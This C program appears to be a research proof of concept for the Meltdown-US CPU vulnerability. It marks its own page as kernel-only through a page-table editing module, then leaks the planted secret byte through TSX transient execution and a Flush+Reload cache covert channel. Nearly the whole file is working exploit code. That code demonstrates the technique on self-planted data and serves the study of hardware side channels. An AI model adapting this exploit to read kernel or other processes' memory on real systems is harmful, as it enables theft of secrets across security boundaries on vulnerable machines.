#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libpte/ptedit_header.h"
#include "libcache/cacheutils.h"

char *victim_page;

#define SECRET 'S'

int main(void) {
  pagesize = sysconf(_SC_PAGESIZE);  
  mem = (char*) malloc( pagesize * 256 );
  memset(mem, 1, pagesize * 256);
  
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // Initialize PTEditor to manipulate page table entries
  if(ptedit_init()) {
    printf("Could not initialize ptedit (did you load the kernel module?)\n");
    return 1;
  }

  // We need a shared mapping. One mapping gets US bit cleared for unauthorized access.
  // The second one remains valid to keep data in the cache as it works better.
  int shm = shm_open("shared_mapping", O_CREAT | O_RDWR, 0644);
  if(shm == -1) {
    fprintf(stderr, "Error: Shared memory\n");
    return -1;
  }

  // Set memory objects size
  if(ftruncate(shm, 4096 * 2) == -1) {
    fprintf(stderr, "Error: Could not set shared memory object size\n");
    return -1;
  }

  // Victim mapping that gets US bit cleared
  victim_page = mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                MAP_SHARED, shm, 0);
 
  // Mapping for keeping data in the cache
  char* accessor = mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                MAP_SHARED, shm, 0);

  // Write data we want to recover to our victim page
  memset( victim_page, SECRET, pagesize * sizeof(char) );
  // Clear US bit of our victim page
  ptedit_pte_clear_bit( victim_page, 0, PTEDIT_PAGE_BIT_USER);

  // Flush our shared memory
  flush_shared_memory(); 

  printf("Output legend:\n");
  printf("  '%c'.....Works\n", (char)SECRET);
  
  for(int r = 0; r < 1000000; r++) {
    // Load data into the cache and fence
    maccess(accessor);
    mfence();
    // Start TSX transaction if available on CPU
    if(try_start()) {
      // Null pointer access prolongs transient window
      maccess(0);
      // Perform access based on unauthorized data
      maccess(mem + *victim_page * pagesize);
      try_abort();
    }
    try_end();

    // Recover data from cache covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if (mix_i != 0 && flush_reload(mem + mix_i * pagesize)) {
        printf("%c ", mix_i);
        fflush(stdout);
      }
    }
  }

  printf("Meltdown-US done!\n");
  munmap(victim_page, pagesize);
  munmap(accessor, pagesize);
  shm_unlink("shared_mapping");
  ptedit_cleanup();
  exit(EXIT_SUCCESS);
}
